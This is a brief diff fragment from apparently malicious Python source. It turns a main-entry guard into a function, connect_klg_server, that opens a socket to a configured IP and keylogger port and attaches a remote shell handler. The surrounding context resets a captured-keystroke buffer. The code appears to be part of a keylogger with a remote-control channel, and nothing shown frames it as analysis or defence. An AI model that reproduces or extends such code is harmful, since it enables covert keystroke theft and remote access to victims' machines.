@@ -72,6 +72,6 @@ def shell(server: socket.socket):
                 KEYLOG_BUFFER = ""
 
 
-if __name__ == "__main__":
+def connect_klg_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect_server(sock, (config.IP, config.KLG_PORT), shell, 5)
